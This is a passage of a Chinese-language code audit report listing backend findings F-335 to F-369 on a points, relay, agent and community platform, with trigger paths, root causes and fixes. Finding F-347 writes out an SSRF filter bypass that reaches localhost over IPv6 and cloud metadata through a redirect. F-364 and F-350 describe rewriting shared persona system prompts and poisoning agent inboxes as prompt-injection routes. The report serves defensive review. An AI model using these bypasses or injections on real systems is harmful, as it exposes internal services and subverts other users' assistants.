- 触发路径：用户已兑换 ≥21 个不同商品后再兑换最早那个 → `pageSize:20` 的最近流水窗口不含旧记录 → 判重通过 → 再次扣分；两个并发请求也同时通过。
- 根因：用"查询结果字符串匹配 `redeem:<id>`"充当幂等键，查询 `orderBy(desc(createdAt)).limit(20)`；`point_transactions` 对 `referenceId` 无唯一约束；判重与扣分不同事务。
- 证据：`member-routes.ts:124-131`；`gamification-queries.ts:333-335`；`adjustPointsInTx` 无条件 insert 流水。
- 影响面：同一商品可重复兑换，积分被重复扣减；并发下两请求都成功。
- 建议修法：加 `unique(user_id, source, reference_id)` 并在同事务 `onConflictDoNothing` + 条件扣减；判重改按 referenceId 精确查询。
- 是否当场可修：部分（唯一索引需迁移；改精确查询可先修）。

#### F-335 `POST /community/posts` 接受 `visibility` 但完全丢弃，private/followers 帖进入全局公开流
- 严重度：P3
- 文件与行号：`routes/community/posts.ts:132,159-189,37-80`；表 `packages/database/src/schema/community.ts:46-64`
- 触发路径：`POST /api/community/posts {"visibility":"private"}` → 201 `status:'published'`，任何人 `GET /api/community/posts` 可读。
- 根因：schema 解析了该字段，但 `createPost` 入参不含它，表也无 visibility 列；全局列表只按 `status=1` 过滤。
- 证据：`:132` 定义；`:185-189` 调用未带；`community.ts:46-64` 无该列。
- 影响面：用户选择私密/仅关注者后内容仍公开可检索，隐私承诺落空。
- 建议修法：删除该参数避免误导，或落库 visibility 并在列表/详情统一过滤。
- 是否当场可修：是。

#### F-336 `GET /circles/:id` 与 `/posts` 对 slug 直接 404，slug 分享链路断裂
- 严重度：P3
- 文件与行号：`routes/community/circles.ts:142,441`；`db/community-queries.ts:72-79`；创建处 `circles.ts:668`
- 触发路径：取创建时返回的 `slug` 请求 `GET /api/circles/<slug>` → 恒 404。
- 根因：两个 GET 在调用 `findCircleByIdOrSlug` 前先 `if (!isUuidString(id)) return 404`，slug 分支成死代码；而发帖/加成员无此 UUID 门，同一 `:id` 语义不一致。
- 证据：`:142` 短路、`:143` 才调用；`:441` 同样；`community-queries.ts:74-78` 有 slug 分支。
- 影响面：以 slug 构造的圈子链接全部 404。
- 建议修法：去掉这两处 `isUuidString` 短路，只保留 not-found；或明确只暴露 UUID。
- 是否当场可修：是。

### B 路：relay 转发 / 健康检查 / 统计（F-337 ~ F-344）

#### F-337 SSE 内错误帧被当成功：扣输入 token、不熔断、不切候选
- 严重度：P2
- 文件与行号：`services/relay-upstream-forwarder.ts:379-393,524-568,587-591`；`routes/v1-public.ts:847-884`
- 触发路径：`POST /v1/chat/completions`（流式）→ 上游 HTTP 200 但 SSE 内 `data: {"error":...}`，或只发 `[DONE]` 空流（额度耗尽/模型不存在常见形态）。
- 根因：成功判定完全基于 HTTP 头，`resp.ok` 后立即 `recordChannelResult(keyPoolId, true)`；`handleLine` 只读 `choices/usage/credits`，全文件无 `json['error']` 分支；收尾仍补 finish 帧并 `recordCall({status:'success'})`。
- 证据：`relay-upstream-forwarder.ts` 中 `error` 仅出现在异常/日志分支；`v1-public.ts:852` `promptTokens = ceil(promptText.length/4)` 必定被扣；`:868` 无条件 `status:'success'`。
- 影响面：用户拿到错误却按成功计费；渠道永远记为健康、不进熔断、不 failover；账单把上游故障显示为正常。
- 建议修法：`pipeChannelStream` 返回 `streamError`（检测 `json.error`、零 choices 且零 usage、未 `sawFinish` 且正文为空）；未写帧前回退重试并 `recordChannelResult(false)`；成功记录移到流正常结束之后。
- 是否当场可修：是。

#### F-338 健康巡检把"管理员手动停用"的 Key 自动重新启用
- 严重度：P2
- 文件与行号：`services/relay-health-check-service.ts:261-290,345`；`routes/admin/relay-key-pool.ts:216`
- 触发路径：管理员 `PUT /admin/relay/key-pool/:id {isEnabled:false}` → 下一轮 `checkAllKeys()` → `recoverDisabledKeys()` 单次 healthy 即置 `isEnabled:true`。
- 根因：人工停用与熔断自动停用共用 `is_enabled` 一个开关，恢复探测不区分来源；schema 无 `manualDisabled/autoDisabled/disabledBy`。
- 证据：`:270` 仅按 `isEnabled=false` 取行；`:282` 直接写 true；`:251-258` 注释自述针对"熔断只禁不查"。
- 影响面：为控成本/合规/排查而停用的 Key 周期被拉回售卖池，产生意外消费；故障排查被自动恢复打断。
- 建议修法：落库停用来源（`extraMetadata.manualDisabled` 或独立列），恢复探测排除手工停用。
- 是否当场可修：是。

#### F-339 停用 Key 恢复探测 `LIMIT 20` 无 `ORDER BY`，多数停用 Key 永远轮不到
- 严重度：P3
- 文件与行号：`services/relay-health-check-service.ts:26,262-271`
- 触发路径：停用 Key 超过 20 个时每轮恢复探测。
- 根因：`.where(isEnabled=false).limit(20)` 无排序，PostgreSQL 不保证返回哪 20 行。
- 证据：`:262-271` 查询无 `orderBy`。
- 影响面：第 21 个及之后的停用 Key 永不探测；与 F-338 叠加时"误恢复"与"永不恢复"并存。
- 建议修法：按 `healthCheckedAt/lastRecoverAttemptAt` 升序轮转或分页扫描全量。
- 是否当场可修：是。

#### F-340 审计密钥登记表 R4 把"解析不到"读成"没有 retired 行"，删行检测静默失效
- 严重度：P3
- 文件与行号：`services/audit-export-key-registry.ts:585-607,638-650,453-466`
- 触发路径：`--check` 自检时 HEAD 版登记表声明被改名/改类型注解，或块内改用双引号导致抽取为空。
- 根因：`registryArrayText` 找不到声明返回 `''`，`extractRegistryBlocks` 把 `''` 也返回 `[]`；`readPreviousFaceEntries` 只在 `git show` 失败时返回 `null`，解析为空仍返回空数组，R4 走"已判定且无问题"。
- 证据：`:587/589/591` 三处 `return ''`；`:607` `if (text.length===0) return []`；`:640` 只判 `text===null`；模块 `:98-101` 自述与实现相反。
- 影响面：一次无关的声明格式改动即可让"退而被删"检查静默通过，旧信封可验证性被破坏而无告警。
- 建议修法：解析失败抛错或返回 `null` 透传到未判定；块内 kid/status 解析失败也计数报错。
- 是否当场可修：是。

#### F-341 下载统计的日界依赖数据库会话时区，北京业务日偏移 8 小时
- 严重度：P3
- 文件与行号：`services/download-stats-service.ts:74-79,83`；`db/index.ts` 未设置 `timezone`
- 触发路径：`GET /downloads/stats?startDate=&endDate=`（管理端统计）。
- 根因：`created_at::date` 与 `(${endDate}::date + INTERVAL '1 day')` 均按 PG 会话 `TimeZone` 截断；容器化 PG 默认多为 UTC。
- 证据：`:83` `to_char(created_at::date,'YYYY-MM-DD')`；`:75/:79` 两个 `::date` 边界；与 F-231 同类错位。
- 影响面：非 UTC 部署下"当日下载量"与北京自然日差 8 小时，跨零点数据落错日期。
- 建议修法：统一 `created_at AT TIME ZONE 'UTC' AT TIME ZONE 'Asia/Shanghai'` 后再 `::date`，或复用 `bizDayStartUtc`。
- 是否当场可修：是。

#### F-342 告警事件先写 `pushStatus:'pushed'` 再推送，失败后不改正
- 严重度：P3
- 文件与行号：`services/relay-alert-rules-service.ts:462-468,472-493`
- 触发路径：规则触发 → 插入事件（硬编码 `pushed`）→ `pushAlert` 抛错（webhook/短信不可用）→ catch 只打日志。
- 根因：推送状态在推送动作之前写死成功；catch 无回写。
- 证据：`:467` 插入即 `pushStatus:'pushed'`；`:487-493` 无 update；全仓无 `pushStatus:'failed'` 写入。
- 影响面：后台"最近告警"把未送达告警显示为已推送，值班误判通道正常。
- 建议修法：先落 `pending`，成功后 update `pushed`，失败 update `failed` + 错误摘要。
- 是否当场可修：是。

#### F-343 保留期清理用单条 `DELETE ... RETURNING` 全量删除并回传全部 id
- 严重度：P3
- 文件与行号：`services/relay-account-usage.ts:205-213,214-218`；`services/audit-service.ts:137-143`
- 触发路径：首次开启清理，或停机/失败后积压超过保留期（台账 30 天、审计 90 天）。
- 根因：一条 SQL 删除全部过期行并 `returning`，删除行数无上限；失败仅 warn 返回 0。
- 证据：`:209-213` 无 `LIMIT`；`:214-218` 失败吞错；`audit-service.ts:139-143` 同构。
- 影响面：积压时形成长事务长锁、WAL 膨胀、Node 侧物化全部 id 造成内存峰值；relay 侧失败被吞后表继续膨胀。
- 建议修法：按 `id IN (SELECT id ... LIMIT 5000)` 循环；失败计数上报。
- 是否当场可修：是。

#### F-344 实时流量快照缓存/去重槽未按 `source` 分键
- 严重度：P3
- 文件与行号：`services/traffic-stats-service.ts:311-336`
- 触发路径：5 秒 TTL 内先后/并发调用 `getTrafficLiveSnapshot('api_logs')` 与 `('visit_logs')`。
- 根因：模块级单槽 `liveCache`/`liveInflight` 无 `source` 维度，命中缓存直接返回另一 source 的值，in-flight 也复用另一 Promise。
- 证据：`:311-312` 单槽；`:323-324` 不比较 source；`:327` 只有发起者传 source。
- 影响面：一旦 source 暴露为参数或新增调用方，PV/UV 串源且 5 秒内持续错。
- 建议修法：改 `Map<TrafficSource, cache>` + `Map<TrafficSource, Promise>`。
- 是否当场可修：是。

### C 路：智能体运行时 / registry-sync / ai-feed（F-345 ~ F-352）

#### F-345 `captureAgentRuntimeStream` 不识别 ai-service 实际 SSE 协议：摘要取不到、失败 done 当成功
- 严重度：P2
- 文件与行号：`services/agent-runtime-stream.ts:58-80`；`services/agent-automation-scheduler.ts:423-431,832-835,870-873`；上游 `apps/ai-service/app/routers/agents.py:1946-1970,1995`
- 触发路径：事件触发/自动化/巡检调用 `/agent-runtime/execute/stream` → SSE 正常结束。
- 根因：解析器只读 `summary/content/message`，上游 done 帧实际字段为 `success/stop_reason/output/goal_status`；`summary` 上游根本不存在，`contentTail` 只拼 hook 状态文案。
- 证据：`agent-runtime-stream.ts:71-78`；`agents.py:1946-1970` done 帧；`agent-automation-scheduler.ts:832-835` 摘要回落 `'执行完成'`。
- 影响面：自动化 `last_result` 落的是 hook 状态串；Goal 自评永远解析不到；`success=false` 的 done 被按成功结算、不重试。
- 建议修法：解析 `success/output/goal_status`；`success===false` 置结构化 failed；摘要优先 `output`。
- 是否当场可修：是。

#### F-346 GitHub webhook 先 ACK 后异步执行，去重仅进程内：可丢触发、可跨实例重跑
- 严重度：P2
- 文件与行号：`routes/github-webhook.ts:109-146,230-282`；`services/agent-event-trigger.ts:104-140,173-200`
- 触发路径：`POST /api/webhooks/github` → 进程内 `DeliveryDedup.record` → `fireEventTriggerAsync`（void）→ 立即 200；随后进程重启/崩溃，或 GitHub 重投落到另一实例。
- 根因：无持久化投递记录/outbox；`DeliveryDedup` 是单进程 Map，重启清空、多实例不共享；异步失败只打日志，落库失败被 `.catch(()=>{})` 吞。
- 证据：`github-webhook.ts:110-113,137,144-145`；`agent-event-trigger.ts:114-116,122-130,181-183`。
- 影响面：ACK 后进程退出即事件永久丢失；同一 delivery 重启/多实例后重复触发多次（重复计费）；规则后补不会补跑。
- 建议修法：先落 `webhook_delivery`（delivery_id 唯一键）+ 任务行再 ACK；异步消费者按唯一键幂等执行并回写。
- 是否当场可修：否（需新增表/唯一索引；可先做"先落库再 ACK"）。

#### F-347 自定义 registry SSRF 防护可被 IPv6 方括号与 302 重定向绕过
- 严重度：P2
- 文件与行号：`services/registry-sync/custom-registry-adapter.ts:28-52,61-91`；`services/registry-sync/types.ts:109-132`
- 触发路径：`IHUI_CUSTOM_REGISTRY_URL=http://[::1]:8080`，或公网 registry 返回 `302 Location: http://169.254.169.254/...` → registry-sync worker 拉取。
- 根因：`parsed.hostname` 对 IPv6 返回 `[::1]`，`net.isIP('[::1]')===0`，内网判断整体跳过；`fetchWithTimeout` 未设 `redirect:'manual'`，重定向后不再校验。
- 证据：`custom-registry-adapter.ts:40-51` 仅 `localhost` + `isIP(hostname)` 进黑名单；本机验证 `isIP('[::1]')===0`；`types.ts:129` 无 `redirect`。
- 影响面：盲 SSRF 可打内网/云元数据；若内网返回 `{items:[...]}` 形状，内容被当 registry 条目写入并在管理面回显（带回显读 SSRF）。
- 建议修法：IPv6 先剥方括号再 `isIP`；用 `net.BlockList`/解析后校验 A/AAAA；`redirect:'manual'` 逐跳复检。
- 是否当场可修：是。

#### F-348 `fetchWithTimeout` 在响应头返回后即清除定时器，响应体读取无超时
- 严重度：P2
- 文件与行号：`services/registry-sync/types.ts:109-132`；调用点 `custom-registry-adapter.ts:79-90`、`github-adapter.ts:139-167,208-214,310-335`、`npm-adapter.ts:59-65,101-109`、`mcp-marketplace-adapter.ts:161-173`
- 触发路径：上游先返回 200 响应头，随后持续 trickle 或不发 body → `await res.json()` 永久挂起。
- 根因：`fetch` 在响应头到达即 resolve，`finally` 立即 `clearTimeout`；body 读取无 Abort 定时器。
- 证据：`types.ts:118-131` `const res = await fetch(...); return res` + `finally { clearTimeout(timer) }`；调用方全部在返回后 `await res.json()`。
- 影响面：registry-sync worker 并发槽被永久占用，后续同步全部排队；多次挂起即整个同步停摆且无 failed 记录。
- 建议修法：超时覆盖到 body 消费（`await res.arrayBuffer()` 后再解析）或返回包装；加总 deadline。
- 是否当场可修：是。

#### F-349 registry 同步适配器异常被吞成空数组，worker 记 `skipped` 并把 trigger 标 `processed`
- 严重度：P2
- 文件与行号：`services/registry-sync/index.ts:57-72`；`workers/registry-sync-worker.ts:87-105,156-193`
- 触发路径：任一来源超时/限流/非 2xx → adapter 抛错 → `fetchAllRawItems` 捕获只 `console.warn` 返回 `[]` → worker `items.length===0` → `status='skipped'` → `markWebhookTriggerProcessed` 无条件执行。
- 根因：聚合函数把"适配器失败"与"上游确实无数据"压成空数组；worker 里为它准备的 catch 分支结构上不可达；status 只看 `items.length`。
- 证据：`index.ts:61-69`；`worker.ts:156-158`；`worker.ts:181-187`。
- 影响面：上游全挂/token 失效时同步面板显示"跳过"、trigger 显示"已处理"，无告警、不重试、不进 BullMQ failed；单源失败被其他源成功掩盖。
- 建议修法：返回 `{items, failures[]}` 或全失败抛错；worker 计 failed，全失败 throw 让 BullMQ 重试；trigger 仅 success 回写 processed。
- 是否当场可修：是。

#### F-350 Agent 团队收件箱未绑定 actor：任意成员可读/标记他人收件箱、可伪造 fromMember
- 严重度：P2
- 文件与行号：`services/agent-team-service.ts:244-287`；`routes/agent-team.ts:145-190`
- 触发路径：团队成员（非 lead）`GET /api/agent-teams/:id/inbox?toMemberKind=human&toMemberId=<lead>` 读 lead 收件箱；`POST …/inbox/:entryId/read` 标记他人已读；`POST …/inbox` 把 `fromMember` 填成 lead 发消息。
- 根因：只校验 actor 属于团队及成员 active，从未要求 `fromMember` 对应 actor、也未要求 `to` 是 actor 自己；`markInboxRead` 仅按 `(teamId, entryId)`。
- 证据：`:249` `loadActiveTeam`；`:253-254`；`:273-275`；`:283-285`。
- 影响面：同队普通成员可读 lead/他人私信与 handoff 元数据（artifactPath、sha256、大小），可污染未读状态、冒充身份发消息；后续 agent 消费收件箱构成提示注入入口。
- 建议修法：由 actor 解析唯一 memberRef 并强制 `fromMember` 相等；human actor 的 `to` 只允许自己（或明确 lead 规则）；`markInboxRead` 加 `toMemberId = actor`。
- 是否当场可修：是。

#### F-351 AI 资讯分页失效：fallback 忽略 offset/total，主查询无稳定排序
- 严重度：P2
- 文件与行号：`services/ai-feed-service.ts:725-818,1130,1144`；参数上限 `routes/ai-feed.ts:30-37`
- 触发路径：`ai_feed_hot_item` 为空（注释明确生产曾 0 条）→ `GET /api/ai-feed/items?page=2`；或大批条目 `lastSeenAt` 同毫秒时翻页。
- 根因：① fallback 只有 `.limit(pageSize)`，无 `.offset`，且 `total: fallback.length` → 每页返回同一批；② 主查询 `orderBy(desc(lastSeenAt), desc(currentHot))` 无 id tie-breaker，批量 upsert 的 `lastSeenAt` 多为同批时间。
- 证据：`:739-741` 两列排序；`:752-771` fallback 无 offset；`:798-803` `total: fallback.length`；`:1130/:1144` `new Date()`。
- 影响面：空表场景第 2 页起内容重复、无法翻到后续条目；非空场景翻页重复/漏条，分页器与 total 不一致。
- 建议修法：fallback 补 offset 与独立 count；主查询加 `id desc`，改游标分页。
- 是否当场可修：是（排序立即可修）。

#### F-352 定时清理任务无分批：`markInactiveAgents` 全量 N+1、`DELETE … RETURNING()` 全量物化
- 严重度：P3
- 文件与行号：`services/scheduled-tasks-service.ts:23-55`；`workers/scheduler-worker.ts:523-546`
- 触发路径：每日 `mark-inactive-agents` / `cleanup-old-heat-stats` / `cleanup-oauth-sessions` 到期。
- 根因：`markInactiveAgents` 先全量 SELECT 180 天未更新 agent 再逐行 UPDATE（无 LIMIT、无集合更新、不复核 status）；两个 cleanup `.delete().returning()` 把每一行完整读回 Node。
- 证据：`:25-37` 逐条 update；`:44-48,53` `.returning()`。
- 影响面：上千次 DB 往返占满 scheduler worker；heat stats/OAuth 会话积压到百万级时单条 DELETE 返回全部行造成内存峰值/OOM 与长事务锁。
- 建议修法：`markInactiveAgents` 改单条集合 UPDATE；cleanup 用 `ctid` 子查询 `LIMIT 5000` 循环或 `RETURNING 1` 只计数。
- 是否当场可修：是。

### D 路：db 剩余查询与 schema（F-353 ~ F-358）

#### F-353 积分规则渠道"全量覆盖"先删后插且无事务：任一步失败/并发覆盖即丢配置
- 严重度：P2
- 文件与行号：`db/point-queries.ts:297-308`；路由 `routes/point.ts:390-403`（挂载 `/api/admin`）
- 触发路径：管理员 `PUT /api/admin/edu-points/relations {pointId, channelIds}`。
- 根因：delete 与 insert 分两条独立语句、不在同一事务；`channelIds` 未做存在性校验。
- 证据：`:301` delete；`:302-306` 另起 insert；全函数无 `db.transaction`（同文件 `adjustEduPoints` 已用事务）。
- 影响面：任一 channelId 无效/DB 瞬时错误 → 删除已生效、插入回滚，该规则渠道关联被清空；并发两次 PUT 最终为两者并集。
- 建议修法：整体包事务，先 `inArray` 校验渠道存在，再 delete + insert。
- 是否当场可修：是。

#### F-354 news_tops / news_recommends 缺 (news_id) 唯一约束，先查后插竞态，列表不去重
- 严重度：P3
- 文件与行号：`packages/database/src/schema/misc-extended-2.ts:24-29,35-40`；`db/misc-extended-queries.ts:78-99,115-121,135-162`；`routes/news.ts:573-578,600-612,201-206`
- 触发路径：管理员两次并发 `PUT /api/news/articles/:id/top`（或 recommend）。
- 根因：`news_id` 仅 `notNull()` 无 unique；路由"find 空→create"无事务/upsert；按 newsId 批量 delete/update 暗示设计上应唯一。
- 证据：schema 两表无 index/unique；`GET /news/articles/pinned` 不去重（对比 `/news/feed` 在 `:245-249` 用 Set 去重）。
- 影响面：同一资讯在置顶/推荐列表重复出现；取消置顶删多行、改 sort 只回写第一行；orphan 行累积。
- 建议修法：加 `unique(news_id)` + 路由 `onConflictDoUpdate`；先清理存量重复。
- 是否当场可修：是。

#### F-355 coze_variables 缺 (bot_id, variable_name) 唯一 + create 无查重 + retrieve 无 ORDER BY LIMIT 1
- 严重度：P3
- 文件与行号：`packages/database/src/schema/misc-extended.ts:27-36`；`db/misc-queries.ts:73-85,95-107`；`routes/coze-variables.ts:63-71,101-108`
- 触发路径：任意登录用户两次 `POST /api/coze/variables/create` 同名同 bot → 两行；`GET /retrieve` 任取其一。
- 根因：`findCozeVariableByName` 用 `.limit(1)` 且无 orderBy；create 不校验已存在；表无唯一约束。
- 证据：`misc-queries.ts:79-84` 无 orderBy；`:95-107` 纯 insert；schema 无 unique。
- 影响面：同名变量指向哪个值不确定（含密钥类值时随机取旧值/他人值）。
- 建议修法：加 unique + `onConflictDoUpdate`；retrieve 加 `orderBy(desc(updatedAt))`。
- 是否当场可修：是。

#### F-356 多个分页查询仅按非唯一 createdAt 排序，LIMIT/OFFSET 翻页重复/漏行
- 严重度：P3
- 文件与行号：`db/content-generation-queries.ts:45`；`db/video-task-queries.ts:29`；`db/authorizations-queries.ts:41`；`db/misc-queries.ts:62`
- 触发路径：用户历史/视频任务/活跃会话/Coze 变量列表翻页。
- 根因：`orderBy(desc(createdAt))` 无 `id` 兜底，`createdAt` 为 `defaultNow()`，同毫秒并列行顺序不稳定。
- 证据：四处均 `.orderBy(desc(x.createdAt)).limit().offset()`；同仓 `billing-queries.ts` 已采用全序排序。
- 影响面：翻页重复/漏项；安全相关的是"活跃会话"列表可能翻不到待撤销会话。
- 建议修法：统一 `orderBy(desc(createdAt), desc(id))`。
- 是否当场可修：是。

#### F-357 findMyMember 未过滤 VIP 到期时间，且 hasVip 只看字段非空
- 严重度：P3
- 文件与行号：`db/my-member-queries.ts:55,64`；对照 `db/vip-queries.ts:94`
- 触发路径：VIP 到期后、`expireVipMembers` 把 `user_vips.status` 翻 0 之前，`GET /api/user/member`。
- 根因：join 只有 `eq(userVips.status,1)` 无 `gte(endTime, now())`；`hasVip = vipEndTime !== null || vipLevelValue !== null`。
- 证据：`vip-queries.getMyVip` 同表同语义带 `gte(userVips.endTime, new Date())`（`:94`），两处口径不一致。
- 影响面：过期用户短暂（或任务停摆时长期）显示为有效会员。
- 建议修法：join 增加到期条件；`hasVip` 同步按到期时间判定。
- 是否当场可修：是。

#### F-358 orders 缺 paid_at / created_at 索引，财务与 BI 聚合每次全表扫
- 严重度：P3
- 文件与行号：`packages/database/src/schema/billing.ts:107-111`；`routes/bi-dashboard.ts:108-117`；`routes/admin/stats.ts:433-439`；迁移 `packages/database/drizzle/0208_careless_prism.sql:310-312`
- 触发路径：管理端 BI 看板 / 运营大盘加载（`status='paid' AND paid_at >= ...` 按天 group by）。
- 根因：`orders` 只有 `user_id`/`status`/`order_type` 单列索引，无 `paid_at`、无 `(status, paid_at)`、无 `(user_id, created_at)`。
- 证据：`0208_careless_prism.sql:310-312` 与 `billing.ts:108-110`；`20261106150000_fix_missing_indexes_fks.sql:55-57` 仍未覆盖 `paid_at`。
- 影响面：订单增长后看板/财报接口随表大小线性变慢。
- 建议修法：新增 `(status, paid_at)` 与 `(user_id, created_at)` 复合索引（CONCURRENTLY）。
- 是否当场可修：是（DDL）。

### E 路：横切权限矩阵与模块副作用（F-359 ~ F-368）
> 编号说明：本轮横切任务发现 buildSchema 数组实例**零新增**（227 个未传 response 的调用点中仅 F-323 已报的 2 个文件返回顶层数组，其余均为对象字面量或 `success({list})`，实测 `additionalProperties:true` 会原样保留嵌套数组）。

#### F-359 任意登录用户可创建平台级智能体分类
- 严重度：P2
- 文件与行号：`routes/agents.ts:687-708`
- 触发路径：普通用户 `POST /api/categories/create {name}` → `createCategory()` 写 `agent_categories`。
- 根因：`agent_categories` 是平台运营资产（`:775-778` 已自认无属主列），DELETE 加了 `requireAdmin`（`:779`），create 未加。
- 证据：`:688-697` 仅 name 必填；`:699` `createCategory`；无 preHandler。
- 影响面：污染全站分类树、下拉/筛选项与 `/categories/list` 统计。
- 建议修法：`server.post('/categories/create', { preHandler: requireAdmin }, ...)`。
- 是否当场可修：是（1 行）。

#### F-360 任意登录用户可改写任意分类（含付费标识）
- 严重度：P1
- 文件与行号：`routes/agents.ts:766-772`；`db/agents-queries.ts:224-238`
- 触发路径：`PUT /api/categories/<任意categoryId>`，body 直接 `as UpdateCategoryInput` 透传 `updateCategory`（无 zod、无角色判定）。
- 根因：读/建/改共用运营表，只有 DELETE 收紧为 admin；写路径无守卫也无字段白名单。
- 证据：`:769` `updateCategory(categoryId, body)`；`:761-762` 为 GET；`:779` 为带 `requireAdmin` 的 DELETE（同资源不同守卫）。
- 影响面：可把任意分类改名/下线/翻转 `isPaid`，影响全站分类展示与 `miniapp-compat-routes.ts:1378` 等消费端的付费判定。
- 建议修法：加 `requireAdmin`，补 zod 白名单。
- 是否当场可修：是。

#### F-361 任意登录用户可切换分类付费开关
- 严重度：P2
- 文件与行号：`routes/agents.ts:787-792,795-800`
- 触发路径：任一登录用户对任意 `categoryId` 调 enable/disable → `updateCategory(...,{isPaid})`。
- 根因：付费开关属运营配置，未加 admin；与同资源 DELETE 守卫不一致。
- 证据：`:789`、`:797` 直接写 `isPaid`，无角色判断。
- 影响面：全站分类付费属性可被任意翻转（付费墙被关或免费分类被标价）。
- 建议修法：两路由加 `preHandler: requireAdmin`。
- 是否当场可修：是。

#### F-362 任意登录用户可重载/清空全局分类缓存
- 严重度：P3
- 文件与行号：`routes/agents.ts:826-843,960-969`
- 触发路径：`POST /api/categories/cache/reload`（DB→Redis 1000 条 pipeline）、`DELETE /api/categories/cache/clear`（`KEYS agent:category:cache:*` + `DEL`）。
- 根因：缓存运维端点未加 admin；`:963` 用 `redis.keys()` 全量扫描。
- 证据：`:829-841`、`:963-967`；均无 preHandler。
- 影响面：可反复清空缓存制造 DB 击穿/写放大；`keys` 在大 key 空间有阻塞风险。
- 建议修法：加 `requireAdmin`；`keys` 改 `scan`。
- 是否当场可修：是。

#### F-363 任意登录用户可写全局 Agent 规则参数（删除却要 admin）
- 严重度：P2
- 文件与行号：`routes/agent-extended.ts:1326-1340,1342-1360`；对照 `:1365`（DELETE 带 `requireAdmin`）、`:1207/1234/1266`（rules CRUD 全 admin）
- 触发路径：`POST /api/agent-ext/rule-params` 或 `PUT /api/agent-ext/rule-params/:id` → `rawInsert/rawUpdate('agent_rule_param')`。
- 根因：legacy 全局表写路径漏加 admin，只有删除收紧。
- 证据：`:1327-1334`、`:1351-1353`；路由无 preHandler。
- 影响面：可增删改所有规则参数，影响全部引用该 ruleId 的前端/Agent 行为配置。
- 建议修法：POST/PUT 加 `requireAdmin`，与 DELETE 对齐。
- 是否当场可修：是。

#### F-364 任意登录用户可改写全局人格（含内置）的 systemPrompt
- 严重度：P1
- 文件与行号：`routes/workspace-ai.ts:1534-1546,1548-1561,1563-1570`；`services/workspace-ai-service.ts:3155-3185,3188`
- 触发路径：任一登录用户 `PATCH /api/workspace/personas/<任意id>`，body 为 `z.record(z.string(), z.unknown())` → `personaRegistry.update(id, body.data)` → 覆盖 `systemPrompt/tools/modelId/enabled` 并 `persist()` 落盘。
- 根因：Persona 是全局共享资产（`BUILTIN_PERSONAS` + 单文件 `PERSONAS_FILE`），无 `ownerId`；`update()` 只保护 `id/builtin/createdAt`，不阻止改 builtin 的其它字段；`delete()` 仅拒绝 builtin。
- 证据：`workspace-ai.ts:1552` 全开放 record；`:1555`；`service:3161-3171` 展开覆盖 + persist；`:3176` 仅 delete 有 builtin 守卫。
- 影响面：改写内置人格系统提示词即改变**所有用户**的 AI 行为（可注入越权指令/绕过安全提示）；可删除他人自建人格；重启后仍生效。
- 建议修法：Persona 增 `ownerId` 并校验；builtin 的 update 拒绝或仅 admin；整组端点先加 admin 闸止血。
- 是否当场可修：部分（加 admin 可当场；属主列需迁移）。

#### F-365 任意登录用户可强制刷新全局结算缓存并取回全平台财务汇总
- 严重度：P2
- 文件与行号：`routes/agents.ts:1088-1094`（`:1080-1085` force-check 同缺）；对照 `:1029`（`GET /settlement/summary` 带 `requireAdmin`）
- 触发路径：`POST /api/settlement/cache/force-refresh` → `findSettlementSummary()`（全表 sum）→ `redis.set('settlement:summary', ..., 'EX', 300)` → 响应体返回 `summary`。
- 根因：缓存运维端点按"读缓存"处理未加 admin，但其查询等价于 admin-only 的 summary 并把结果直接放响应。
- 证据：`:1090-1093`；`db/agents-queries.ts:312-333`。
- 影响面：任一登录用户可读全平台成交/已结/未结金额与笔数（越权信息泄露），并可反复写共享缓存键。
- 建议修法：两端点加 `requireAdmin`；refresh 只回 `{refreshed:true}`。
- 是否当场可修：是。

#### F-366 任意登录用户可为任意 agent 伪造审核台账（含自填 approved）
- 严重度：P2
- 文件与行号：`routes/agents.ts:1245-1261`；落库 `db/agents-queries.ts:493-503`
- 触发路径：`POST /api/examine/submit {agentId:"任意", status:"approved"}` → `createExamine({agentId, userId: request.userId, status: body.status ?? 'pending'})`。
- 根因：只取 userId 不校验 agentId 归属；`status` 未固定为 pending；同族 PUT/DELETE 已收紧（`:1274`、`:1287-1290`）。
- 证据：`:1256-1259`；`agents-queries.ts:496-500` 直接 insert 客户端 status；`GET /examine/:recordId`（`:1264`）与 `/examine/list`（`:1218`）对所有登录用户开放。
- 影响面：审核台账可被污染；可为他人的 agent 制造 approved/rejected 记录；配套可读他人审核记录。
- 建议修法：submit 固定 `status='pending'`；校验 agentId 属主；list/detail 加 admin 或属主过滤。
- 是否当场可修：是。

#### F-367 cli-import fallback 清理定时器在模块顶层启动，API 与 worker 双跑
- 严重度：P3
- 文件与行号：`services/cli-import/redis-cache.ts:150-156`
- 触发路径：`buildServer()` → `routes/index.ts:284,1095-1096` → `routes/cli-import.ts:50` → `services/cli-import/index.ts:22` → 本模块 import 即 `setInterval(5min)`。
- 根因：无"仅 API 进程启动"开关；worker 也通过 `buildServer()` 加载全部路由。
- 证据：`:150-156` 模块作用域 `const cleanupTimer = setInterval(...)` + `unref()`；`worker-entry.ts:33` 调 `buildServer()`。
- 影响面：每进程各持一个清理器，各清本进程 Map（无跨进程重复业务），仅多一个 unref 定时器与空遍历；与 F-302 不同型（不写库/不调外部）。
- 建议修法：改 `startFallbackCleanup()/stopFallbackCleanup()` 由 API 入口显式调用，或在 worker 入口设 `ENABLE_ROUTE_TIMERS=false`。
- 是否当场可修：是。

#### F-368 relay-channel-router 亲和性清理定时器在模块顶层 if 块内启动，API 与 worker 双跑
- 严重度：P3
- 文件与行号：`services/relay-channel-router.ts:228-237`（常量 `:50`）
- 触发路径：`index.ts:76` 与 `routes/admin/relay-channels.ts:50` → `buildServer()`（worker 同样）→ import 即启动。
- 根因：同 F-367，模块级副作用；已有 `stopRelayChannelRouterSweep()`（`:240`）但启动不可关闭。
- 证据：`:225-227` 注释；`:228` 顶层 `if`；`:236` `unref()`。
- 影响面：worker 侧纯浪费；`sessionAffinityMap` 本身进程内，无跨进程业务后果。
- 建议修法：抽出 `startRelayChannelRouterSweep()` 由 API 入口调用。
- 是否当场可修：是。

---

## 十七、第十三轮新增（资金订阅 / 风控上传 / 知识库RAG / 剩余路由 / db与权限矩阵）

> 基线：origin/main；五路并行（A 资金域、B 风控上传存储、C 知识库RAG模型映射、D 剩余路由、E db/schema 与权限矩阵）。
> 标注「已复核」的条目由主代理直接读源码二次确认；其余为子代理实读 + 行号证据，进入下一轮前应抽验。

### A 路：资金与订阅

#### F-369 订阅发配额用事务外快照做绝对值写回，覆盖并发扣费（已复核，P1）
- 严重度：P1
